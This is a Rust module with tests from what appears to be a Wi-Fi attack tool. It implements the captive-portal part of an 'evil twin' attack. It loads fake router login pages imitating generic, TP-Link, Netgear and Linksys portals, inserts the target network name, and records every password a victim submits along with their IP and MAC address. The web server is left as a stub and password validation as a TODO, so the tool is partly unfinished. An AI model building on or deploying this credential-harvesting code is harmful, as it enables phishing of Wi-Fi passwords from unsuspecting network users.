/*!
 * Captive Portal Web Server
 *
 * Serves HTML templates and handles credential submission.
 * Note: Full web server implementation requires actix-web dependency.
 */

use crate::core::evil_twin::{
    CapturedCredential, EvilTwinParams, EvilTwinProgress, PortalTemplate,
};
use std::sync::{Arc, Mutex};

/// Load template content from file
pub fn load_template(template: PortalTemplate) -> Result<String, std::io::Error> {
    let template_name = match template {
        PortalTemplate::Generic => "generic.html",
        PortalTemplate::TpLink => "tplink.html",
        PortalTemplate::Netgear => "netgear.html",
        PortalTemplate::Linksys => "linksys.html",
    };

    // Try multiple possible locations
    let possible_paths = vec![
        format!("src/templates/{}", template_name),
        format!("templates/{}", template_name),
        format!("/tmp/brutifi_templates/{}", template_name),
    ];

    for path in possible_paths {
        if let Ok(content) = std::fs::read_to_string(&path) {
            return Ok(content);
        }
    }

    // Fallback: return embedded minimal template
    Ok(r#"<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login - {{ssid}}</title>
</head>
<body>
    <h1>WiFi Network: {{ssid}}</h1>
    <form method="POST" action="/submit">
        <input type="password" name="password" required>
        <button type="submit">Connect</button>
    </form>
</body>
</html>"#
        .to_string())
}

/// Replace template variables with actual values
pub fn render_template(template_content: &str, ssid: &str) -> String {
    template_content.replace("{{ssid}}", ssid)
}

/// Handle credential submission (validation logic)
pub fn handle_credential_submission(
    _params: &EvilTwinParams,
    password: String,
    client_ip: String,
    _client_mac: String,
    credentials: Arc<Mutex<Vec<CapturedCredential>>>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> bool {
    let _ = progress_tx.send(EvilTwinProgress::CredentialAttempt {
        password: password.clone(),
    });

    // Store credential
    if let Ok(mut creds) = credentials.lock() {
        creds.push(CapturedCredential {
            ssid: _params.target_ssid.clone(),
            password: password.clone(),
            client_mac: _client_mac.clone(),
            client_ip: client_ip.clone(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            validated: false,
        });
    }

    // TODO: Actual validation against real AP
    // For now, we'll just return false (not validated)
    // In a full implementation, this would call validate_password_against_ap

    let _ = progress_tx.send(EvilTwinProgress::ValidationFailed {
        password: password.clone(),
    });

    false
}

/// Start captive portal web server (stub)
///
/// Full implementation requires actix-web dependency.
/// This is a placeholder that would need to be implemented
/// with a proper async web framework.
pub async fn start_captive_portal(
    _params: &EvilTwinParams,
    _credentials: Arc<Mutex<Vec<CapturedCredential>>>,
    _progress_tx: tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
    _stop_flag: Arc<std::sync::atomic::AtomicBool>,
) -> Result<(), String> {
    // TODO: Implement with actix-web or similar
    // For now, return error indicating it's not implemented
    Err("Captive portal web server requires actix-web dependency (not yet implemented)".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    // =========================================================================
    // Template Loading Tests
    // =========================================================================

    #[test]
    fn test_load_template_fallback_generic() {
        // Should return fallback template if files don't exist
        let result = load_template(PortalTemplate::Generic);
        assert!(result.is_ok());
        let content = result.unwrap();
        assert!(content.contains("{{ssid}}"));
        assert!(content.contains("password"));
        assert!(content.contains("form"));
    }

    #[test]
    fn test_load_template_fallback_tplink() {
        let result = load_template(PortalTemplate::TpLink);
        assert!(result.is_ok());
        let content = result.unwrap();
        // Fallback template should have basic structure
        assert!(content.contains("password") || content.contains("{{ssid}}"));
    }

    #[test]
    fn test_load_template_fallback_netgear() {
        let result = load_template(PortalTemplate::Netgear);
        assert!(result.is_ok());
    }

    #[test]
    fn test_load_template_fallback_linksys() {
        let result = load_template(PortalTemplate::Linksys);
        assert!(result.is_ok());
    }

    #[test]
    fn test_load_all_templates_no_panic() {
        let templates = [
            PortalTemplate::Generic,
            PortalTemplate::TpLink,
            PortalTemplate::Netgear,
            PortalTemplate::Linksys,
        ];

        for template in templates {
            let result = load_template(template);
            assert!(result.is_ok(), "Failed to load template: {:?}", template);
        }
    }

    #[test]
    fn test_fallback_template_has_html_structure() {
        let result = load_template(PortalTemplate::Generic);
        assert!(result.is_ok());
        let content = result.unwrap();

        // Check for basic HTML structure
        assert!(content.contains("<!DOCTYPE html>") || content.contains("<html"));
        assert!(content.contains("<form"));
        assert!(content.contains("password"));
    }

    // =========================================================================
    // Template Rendering Tests
    // =========================================================================

    #[test]
    fn test_render_template_basic() {
        let template = "Network: {{ssid}}, Password: {{ssid}}";
        let rendered = render_template(template, "TestNetwork");
        assert_eq!(rendered, "Network: TestNetwork, Password: TestNetwork");
    }

    #[test]
    fn test_render_template_multiple_occurrences() {
        let template = "{{ssid}} - {{ssid}}";
        let rendered = render_template(template, "WiFi");
        assert_eq!(rendered, "WiFi - WiFi");
    }

    #[test]
    fn test_render_template_no_placeholder() {
        let template = "No placeholders here";
        let rendered = render_template(template, "TestNetwork");
        assert_eq!(rendered, "No placeholders here");
    }

    #[test]
    fn test_render_template_empty_ssid() {
        let template = "SSID: {{ssid}}";
        let rendered = render_template(template, "");
        assert_eq!(rendered, "SSID: ");
    }

    #[test]
    fn test_render_template_special_characters_in_ssid() {
        let template = "SSID: {{ssid}}";
        let rendered = render_template(template, "Test<Network>&\"'");
        assert_eq!(rendered, "SSID: Test<Network>&\"'");
    }

    #[test]
    fn test_render_template_unicode_ssid() {
        let template = "Network: {{ssid}}";
        let rendered = render_template(template, "WiFi_Test");
        assert_eq!(rendered, "Network: WiFi_Test");
    }

    #[test]
    fn test_render_template_ssid_with_spaces() {
        let template = "Connected to: {{ssid}}";
        let rendered = render_template(template, "My Home Network");
        assert_eq!(rendered, "Connected to: My Home Network");
    }

    #[test]
    fn test_render_template_long_ssid() {
        let template = "SSID: {{ssid}}";
        let long_ssid = "A".repeat(32); // Max WiFi SSID length
        let rendered = render_template(template, &long_ssid);
        assert!(rendered.contains(&long_ssid));
    }

    #[test]
    fn test_render_template_preserves_html() {
        let template =
            r#"<html><head><title>{{ssid}}</title></head><body><h1>{{ssid}}</h1></body></html>"#;
        let rendered = render_template(template, "TestNet");

        assert!(rendered.contains("<html>"));
        assert!(rendered.contains("<title>TestNet</title>"));
        assert!(rendered.contains("<h1>TestNet</h1>"));
    }

    // =========================================================================
    // Credential Submission Tests
    // =========================================================================

    #[test]
    fn test_handle_credential_submission_stores_credential() {
        let params = EvilTwinParams::default();
        let credentials: Arc<Mutex<Vec<CapturedCredential>>> = Arc::new(Mutex::new(Vec::new()));
        let (progress_tx, _rx) = tokio::sync::mpsc::unbounded_channel();

        let result = handle_credential_submission(
            &params,
            "test_password".to_string(),
            "192.168.1.100".to_string(),
            "AA:BB:CC:DD:EE:FF".to_string(),
            credentials.clone(),
            &progress_tx,
        );

        // Currently returns false (validation not implemented)
        assert!(!result);

        // Check that credential was stored
        let creds = credentials.lock().unwrap();
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0].password, "test_password");
        assert_eq!(creds[0].client_ip, "192.168.1.100");
        assert_eq!(creds[0].client_mac, "AA:BB:CC:DD:EE:FF");
    }

    #[test]
    fn test_handle_credential_submission_multiple() {
        let params = EvilTwinParams::default();
        let credentials: Arc<Mutex<Vec<CapturedCredential>>> = Arc::new(Mutex::new(Vec::new()));
        let (progress_tx, _rx) = tokio::sync::mpsc::unbounded_channel();

        for i in 0..5 {
            handle_credential_submission(
                &params,
                format!("password{}", i),
                format!("192.168.1.{}", 100 + i),
                format!("AA:BB:CC:DD:EE:{:02X}", i),
                credentials.clone(),
                &progress_tx,
            );
        }

        let creds = credentials.lock().unwrap();
        assert_eq!(creds.len(), 5);
    }

    #[test]
    fn test_handle_credential_submission_sends_progress() {
        let params = EvilTwinParams::default();
        let credentials: Arc<Mutex<Vec<CapturedCredential>>> = Arc::new(Mutex::new(Vec::new()));
        let (progress_tx, mut progress_rx) = tokio::sync::mpsc::unbounded_channel();

        handle_credential_submission(
            &params,
            "test_pass".to_string(),
            "192.168.1.100".to_string(),
            "AA:BB:CC:DD:EE:FF".to_string(),
            credentials,
            &progress_tx,
        );

        // Check that progress messages were sent
        let msg1 = progress_rx.try_recv();
        assert!(msg1.is_ok());

        if let Ok(EvilTwinProgress::CredentialAttempt { password }) = msg1 {
            assert_eq!(password, "test_pass");
        } else {
            panic!("Expected CredentialAttempt progress message");
        }
    }

    #[test]
    fn test_handle_credential_submission_empty_password() {
        let params = EvilTwinParams::default();
        let credentials: Arc<Mutex<Vec<CapturedCredential>>> = Arc::new(Mutex::new(Vec::new()));
        let (progress_tx, _rx) = tokio::sync::mpsc::unbounded_channel();

        handle_credential_submission(
            &params,
            String::new(),
            "192.168.1.100".to_string(),
            "AA:BB:CC:DD:EE:FF".to_string(),
            credentials.clone(),
            &progress_tx,
        );

        let creds = credentials.lock().unwrap();
        assert_eq!(creds.len(), 1);
        assert!(creds[0].password.is_empty());
    }

    #[test]
    fn test_handle_credential_submission_special_characters() {
        let params = EvilTwinParams::default();
        let credentials: Arc<Mutex<Vec<CapturedCredential>>> = Arc::new(Mutex::new(Vec::new()));
        let (progress_tx, _rx) = tokio::sync::mpsc::unbounded_channel();

        let special_password = "p@$$w0rd!#$%^&*()";
        handle_credential_submission(
            &params,
            special_password.to_string(),
            "192.168.1.100".to_string(),
            "AA:BB:CC:DD:EE:FF".to_string(),
            credentials.clone(),
            &progress_tx,
        );

        let creds = credentials.lock().unwrap();
        assert_eq!(creds[0].password, special_password);
    }

    // =========================================================================
    // Captive Portal Server Tests (Stub)
    // =========================================================================

    #[tokio::test]
    async fn test_start_captive_portal_not_implemented() {
        let params = EvilTwinParams::default();
        let credentials: Arc<Mutex<Vec<CapturedCredential>>> = Arc::new(Mutex::new(Vec::new()));
        let (progress_tx, _rx) = tokio::sync::mpsc::unbounded_channel();
        let stop_flag = Arc::new(std::sync::atomic::AtomicBool::new(false));

        let result = start_captive_portal(&params, credentials, progress_tx, stop_flag).await;

        // Currently returns error as not implemented
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .contains("requires actix-web dependency"));
    }

    // =========================================================================
    // Integration Tests
    // =========================================================================

    #[test]
    fn test_load_and_render_template() {
        let result = load_template(PortalTemplate::Generic);
        assert!(result.is_ok());

        let template = result.unwrap();
        let rendered = render_template(&template, "MyNetwork");

        // Should have replaced all placeholders
        assert!(!rendered.contains("{{ssid}}"));
        assert!(rendered.contains("MyNetwork"));
    }

    #[test]
    fn test_template_form_action() {
        let result = load_template(PortalTemplate::Generic);
        assert!(result.is_ok());

        let content = result.unwrap();
        // Form should post to /submit
        assert!(content.contains("/submit") || content.contains("POST"));
    }

    #[test]
    fn test_credential_timestamp_is_set() {
        let params = EvilTwinParams::default();
        let credentials: Arc<Mutex<Vec<CapturedCredential>>> = Arc::new(Mutex::new(Vec::new()));
        let (progress_tx, _rx) = tokio::sync::mpsc::unbounded_channel();

        let before = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();

        handle_credential_submission(
            &params,
            "test".to_string(),
            "192.168.1.100".to_string(),
            "AA:BB:CC:DD:EE:FF".to_string(),
            credentials.clone(),
            &progress_tx,
        );

        let after = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();

        let creds = credentials.lock().unwrap();
        assert!(creds[0].timestamp >= before);
        assert!(creds[0].timestamp <= after);
    }

    #[test]
    fn test_credential_not_validated_by_default() {
        let params = EvilTwinParams::default();
        let credentials: Arc<Mutex<Vec<CapturedCredential>>> = Arc::new(Mutex::new(Vec::new()));
        let (progress_tx, _rx) = tokio::sync::mpsc::unbounded_channel();

        handle_credential_submission(
            &params,
            "test".to_string(),
            "192.168.1.100".to_string(),
            "AA:BB:CC:DD:EE:FF".to_string(),
            credentials.clone(),
            &progress_tx,
        );

        let creds = credentials.lock().unwrap();
        assert!(!creds[0].validated);
    }
}
